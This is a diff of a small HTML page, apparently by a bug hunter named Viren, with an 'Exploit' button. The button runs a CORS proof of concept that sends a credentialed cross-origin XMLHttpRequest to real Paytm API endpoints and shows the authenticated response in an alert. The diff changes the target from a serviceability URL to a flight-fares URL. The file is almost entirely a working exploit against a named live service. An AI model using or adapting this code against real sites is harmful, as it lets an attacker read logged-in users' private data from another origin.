@@ -2,7 +2,8 @@
 <body style="text-align:center;">
 <h1>Helllo, it's VIREN!</h1>
   <p>Let's try something hacking!</p>
-  <div id="demo">
+  
+<div id="demo">
 <button type="button" onclick="cors()">Exploit</button>
 </div>
  
@@ -14,7 +15,7 @@ function cors() {
       document.getElementById("demo").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://serviceability.paytm.com/v2/checkavailability/?channel=web&child_site_id=6&site_id=2&version=2&code=382424", true);
+  xhttp.open("GET", "https://travel.paytm.com/api/a/flights/v1/get_roundtrip_fares?source=AMD&destination=IXJ&start_date=2018-08-24&end_date=2019-08-24&class=E&adults=1&children=0&infants=0", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
